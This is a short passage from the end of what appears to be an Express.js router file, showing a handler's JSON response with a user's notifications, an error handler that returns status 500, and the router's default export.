      result: result,
      currentNotifications: user?.notifications || []
    });
  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ error: err.message });
  }
});

export default router;
